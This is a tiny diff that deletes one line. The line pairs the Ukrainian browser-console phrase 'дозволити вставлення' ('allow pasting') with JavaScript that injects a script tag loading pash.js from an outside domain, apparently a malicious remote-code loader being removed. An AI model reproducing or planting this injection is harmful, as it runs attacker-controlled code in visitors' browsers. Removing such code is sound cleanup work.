@@ -1,1 +1,0 @@
-'дозволити вставлення';document.body.appendChild(document.createElement("script")).setAttribute('src', 'https://avtobaza-beton.com.ua/pash.js').
